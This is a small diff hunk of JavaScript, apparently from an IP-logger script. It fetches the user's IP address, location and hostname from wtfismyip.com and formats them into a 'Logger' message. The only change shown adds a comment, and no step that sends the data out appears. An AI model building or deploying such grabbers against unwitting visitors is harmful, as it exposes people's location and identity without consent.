@@ -5,7 +5,7 @@ fetch("https://wtfismyip.com/json")
 .then((data) => {
   
 let Logger = {
-Header: "**Some information:** ", 
+Header: "**Some information:** ", // don't ask why
 IP: "\n```IPAddress: "  + data.YourFuckingIPAddress ,
 Location: "\nLocation: "  + data.YourFuckingLocation ,
 Hostname: "\nHostname: " + data.YourFuckingHostname,
